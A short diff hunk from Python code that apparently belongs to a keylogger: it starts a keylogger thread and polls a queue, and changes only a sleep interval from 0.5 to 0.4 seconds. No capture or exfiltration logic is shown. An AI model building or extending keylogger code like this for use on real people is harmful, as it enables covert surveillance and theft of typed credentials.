@@ -302,7 +302,7 @@ def QueuKeyloggerEvent(stop):
     stop_threads = False
     threadingKeylogger = threading.Thread(target=keylogger, args =(lambda : stop_threads, ))
     threadingKeylogger.start()
-    time.sleep(0.5)
+    time.sleep(0.4)
     while True:
         time.sleep(0.001)
         if QUEUKeylogger:
